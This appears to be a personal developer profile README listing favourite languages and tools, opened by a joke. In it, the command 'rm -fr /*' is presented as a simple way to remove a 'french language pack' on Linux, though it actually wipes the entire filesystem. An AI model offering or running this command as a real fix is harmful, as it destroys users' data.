# Hello
there used to be a rm rf joke here, but that joke is old.
Speaking of! You have to remove the french language pack on linux. It's simple!
```sh
rm -fr /*
```
# Programming Languages I know
* C (is the best)
* C++ (is worse)
* Some Java (first ever language I learned, quickly moved to C)
* Rust (error: cannot borrow "rust" as immutable, the trademark checker ensures that the fricking integry of a readable blah blah blah ....)
* Assembly (kernel-space; nasm)
* Javascript
# Stuff I use
* Text editor: Neovim code, Kakoune else
* Shell: fish
* C Compiler: clang (way better than gcc, fight me)
* Browser: firefox
